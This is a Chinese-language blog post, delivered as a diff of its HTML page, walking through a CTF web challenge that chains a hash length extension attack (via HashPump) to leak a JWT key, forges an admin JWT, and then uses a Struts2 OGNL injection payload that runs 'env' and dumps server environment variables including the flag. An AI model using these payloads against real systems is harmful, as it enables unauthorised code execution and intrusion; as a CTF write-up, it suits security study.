@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="*ctf–web–jwt2struts       记录一下 打开发现，猜测为jwt伪造  You are now logged in as user. Try to become admin.  CTRL+U  JWT_key.php  第一个知识点，想办法拿到Jwt伪造的key 123456789101112131415161718192021&lt;?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jwt&amp;struts2">
+<meta property="og:url" content="https://qingchuana.github.io/2023/07/29/jwtstruts/index.html">
+<meta property="og:site_name" content="晴川&#39;s Blog">
+<meta property="og:description" content="*ctf–web–jwt2struts       记录一下 打开发现，猜测为jwt伪造  You are now logged in as user. Try to become admin.  CTRL+U  JWT_key.php  第一个知识点，想办法拿到Jwt伪造的key 123456789101112131415161718192021&lt;?">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/29/jwtstruts/AAwangzhan/1/hexoblog/source/image/image-20230729211158878.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/29/jwtstruts/AAwangzhan/1/hexoblog/source/image/image-20230729210104769.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/29/jwtstruts/AAwangzhan/1/hexoblog/source/image/image-20230729210217434.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/29/jwtstruts/AAwangzhan/1/hexoblog/source/image/image-20230729210132220.png">
+<meta property="article:published_time" content="2023-07-29T13:49:15.000Z">
+<meta property="article:modified_time" content="2023-11-12T09:22:27.731Z">
+<meta property="article:author" content="Qingchuan">
+<meta property="article:tag" content="unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingchuana.github.io/2023/07/29/jwtstruts/AAwangzhan/1/hexoblog/source/image/image-20230729211158878.png"><title>Jwt&amp;struts2 | 晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/2023/07/29/jwtstruts/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Jwt&amp;struts2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body">
+        <h1 id="ctf–web–jwt2struts">
+          <a href="#ctf–web–jwt2struts" class="heading-link"><i class="fas fa-link"></i></a><a href="#ctf–web–jwt2struts" class="headerlink" title="*ctf–web–jwt2struts"></a>*ctf–web–jwt2struts</h1>
+      <p>记录一下</p>
+<p>打开发现，猜测为jwt伪造</p>
+<blockquote>
+<p>You are now logged in as user. Try to become admin.</p>
+</blockquote>
+<p>CTRL+U</p>
+<blockquote>
+<p>JWT_key.php</p>
+</blockquote>
+<p>第一个知识点，想办法拿到Jwt伪造的key</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>这是一个</p>
+
+        <h2 id="哈希长度扩展攻击">
+          <a href="#哈希长度扩展攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2>
+      <p>用工具<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/bwall/HashPump">hashpump</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ ./hashpump</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;这里填已经有的hash值</p>
+<p>input  Data&#x3D;adminroot  &#x2F;&#x2F;这里填已知的，也就是你要上传的</p>
+<p>input Key&#x3D;14  &#x2F;&#x2F;这里填未知的密文长度，题目给了14</p>
+<p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;这里填你自己要添加的字符串，长度尽量大于2</p>
+</blockquote>
+<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729211158878.png"></p>
+<blockquote>
+<p>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00abcd</p>
+</blockquote>
+<p>把\x替换为%</p>
+<p>因为</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br></pre></td></tr></table></div></figure>
+
+<p>password进行了一次url解码，我们要先提前对它进行一次url编码</p>
+<blockquote>
+<p>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00abcd</p>
+</blockquote>
+<p>编码后为</p>
+<blockquote>
+<p>root%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25b8%2500%2500%2500%2500%2500%2500%2500abcd</p>
+</blockquote>
+<p>payload</p>
+<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210104769.png"></p>
+<p>拿到key</p>
+<blockquote>
+<p>sk-he00lctf3r</p>
+</blockquote>
+<p>抓包原页面拿session</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://jwt.io/">jwt</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210217434.png"></p>
+<p>在”your-256-bit-secret”处放入你的key</p>
+<p>修改明文，可以拿到加密后的session</p>
+<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210132220.png"></p>
+<p>修改session放包，发现页面自动跳转到&#x2F;admiiiiiiiiiiin&#x2F;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;do you know struts2?</span><br></pre></td></tr></table></div></figure>
+
+<p>看名字可以知道是</p>
+
+        <h2 id="struts2">
+          <a href="#struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2>
+      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>flag在环境变量里可以找到，原来的文件…..可能没有，可能没有了</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>HOSTNAME&#x3D;27102e2d72c4LANGUAGE&#x3D;en_US:enJAVA_HOME&#x3D;&#x2F;opt&#x2F;java&#x2F;openjdkGPG_KEYS&#x3D;05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 5C3C5F3E314C866292F359A8F3AD5C94A67F707E 765908099ACF92702C7D949BFA0C35EA8AA299F1 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23PWD&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatTOMCAT_SHA512&#x3D;9e6770e9c9c3b630011c0f0e320b31bb0ea3700d52247a12d544ea25f9ee4d93613ad6ccb7939f97fb05e1760978a7547eccb16352d73fa28886134ba58f3f8cTOMCAT_MAJOR&#x3D;8HOME&#x3D;&#x2F;rootLANG&#x3D;en_US.UTF-8TOMCAT_NATIVE_LIBDIR&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libFLAG&#x3D;flag{7r0m_jwt_t0_struts2}CATALINA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatSHLVL&#x3D;0JDK_JAVA_OPTIONS&#x3D; –add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.io&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util.concurrent&#x3D;ALL-UNNAMED –add-opens&#x3D;java.rmi&#x2F;sun.rmi.transport&#x3D;ALL-UNNAMEDLD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libLC_ALL&#x3D;en_US.UTF-8PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin:&#x2F;opt&#x2F;java&#x2F;openjdk&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binTOMCAT_VERSION&#x3D;8.5.91JAVA_VERSION&#x3D;jdk8u372-b07</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://qingchuana.github.io">Qingchuan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://qingchuana.github.io/2023/07/29/jwtstruts/">https://qingchuana.github.io/2023/07/29/jwtstruts/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://qingchuana.github.io/tags/unserialize/">unserialize</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Php反序列化字符串逃逸</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/07/22/SSRF%20%20web351-/"><span class="paginator-prev__text">SSRF-CTFshow</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E2%80%93web%E2%80%93jwt2struts"><span class="toc-number">1.</span> <span class="toc-text">
+          *ctf–web–jwt2struts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.</span> <span class="toc-text">
+          哈希长度扩展攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#struts2"><span class="toc-number">1.2.</span> <span class="toc-text">
+          struts2</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
